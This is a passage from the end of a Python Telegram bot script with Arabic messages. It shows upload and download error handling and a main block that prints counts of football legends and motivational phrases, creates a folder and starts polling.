        except Exception as e:
            bot.send_message(prog_msg.chat.id, f"❌ خطأ في الرفع: {e}")
    else:
        bot.edit_message_text(f"❌ فشل التحميل:\n{success}", prog_msg.chat.id, prog_msg.message_id)

# ==========================================
# 🏁 تشغيل البوت
# ==========================================
if __name__ == "__main__":
    print("🚀 بدء تشغيل البوت المتكامل...")
    print(f"📊 لاعبين: {len(FOOTBALL_LEGENDS)}")
    print(f"💬 عبارات تحفيزية: {len(MOTIVATIONAL_PHRASES)}")
    print(f"🔐 الأدمن: {ADMIN_ID}")
    os.makedirs(BASE_DIR, exist_ok=True)
    bot.infinity_polling(timeout=90, long_polling_timeout=5)
